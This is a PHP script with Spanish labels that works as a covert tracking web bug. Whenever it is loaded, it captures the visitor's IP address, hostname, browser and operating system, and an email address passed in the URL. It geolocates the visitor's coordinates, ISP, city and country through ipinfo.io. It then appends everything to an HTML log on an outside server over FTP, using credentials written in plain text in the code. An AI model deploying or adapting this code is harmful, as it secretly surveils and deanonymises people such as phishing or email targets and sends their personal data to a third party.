<?php
$c = $_GET['c'];
date_default_timezone_set('America/Caracas');
@ $details = json_decode(file_get_contents("http://ipinfo.io/{$_SERVER['HTTP_X_FORWARDED_FOR']}/json"));
@ $hostname=gethostbyaddr($_SERVER['HTTP_X_FORWARDED_FOR']);
@ $fileHandle = fopen($outputWebBug, "a");
$QUERY_STRING = preg_replace("%[^/a-zA-Z0-9@,_=]%", '', $_SERVER['QUERY_STRING']);
$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
$hostname = gethostbyaddr($_SERVER['HTTP_X_FORWARDED_FOR']);
$navegador = $_SERVER['HTTP_USER_AGENT'];
$time = time();
$f = fopen("ftp://openresults:qwertyuiop@files.000webhost.com/public_html/1/mail.html", "a");
fwrite ($f, '<font color="#A4A4A4">Direccion IP </font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="tomato">=</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#2E9AFE">'.$ip.'</font><br>');
fwrite ($f, '<font color="#A4A4A4">Nombre del Host </font>&nbsp;&nbsp;&nbsp;&nbsp;<font color="tomato">=</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#2E9AFE">'.$hostname.'</font><br>');
fwrite ($f, '<font color="#A4A4A4">Navegador y O.S </font>&nbsp;&nbsp;&nbsp;&nbsp;<font color="tomato">=</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#2E9AFE">'.$navegador.'</font><br>');
fwrite ($f, '<font color="#A4A4A4">Coordenadas </font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="tomato">=</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#2E9AFE">'.$details->loc.'</font><br>');
fwrite ($f, '<font color="#A4A4A4">PSI </font>&nbsp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="tomato">=</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#2E9AFE">'.$details->org.'</font><br>');
fwrite ($f, '<font color="#A4A4A4">Ciudad </font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="tomato">=</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#2E9AFE">'.$details->city.'</font><br>');
fwrite ($f, '<font color="#A4A4A4">Estado </font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="tomato">=</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#2E9AFE">'.$details->region.'</font><br>');
fwrite ($f, '<font color="#A4A4A4">Pais </font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="tomato">=</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#2E9AFE">'.$details->country.'</font><br>');
fwrite ($f, '<font color="#A4A4A4">Fecha </font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="tomato">=</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#2E9AFE">'.date("D dS M, Y h:i a").'</font><br>');
fwrite ($f, '<font color="#A4A4A4">Correo </font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FF0000">=</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#39ba48">'.$c.'</font><br>');
fwrite ($f, '<font color="#A4A4A4"><br><br><hr><br><br>');
fclose($f);
exit;
?>
